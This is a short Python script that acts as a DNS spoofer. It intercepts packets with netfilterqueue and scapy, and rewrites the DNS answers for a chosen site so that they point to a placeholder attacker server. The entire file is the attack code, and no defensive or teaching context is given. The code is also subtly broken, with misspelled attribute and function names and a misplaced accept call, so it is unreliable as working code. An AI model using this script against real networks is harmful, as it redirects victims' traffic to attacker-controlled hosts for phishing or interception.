#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get.payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet(scapy.DNSQR).qname
        if "xxxxsitexxxxx" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="hacker web server ip here")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].let
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process.packet)
queue.run()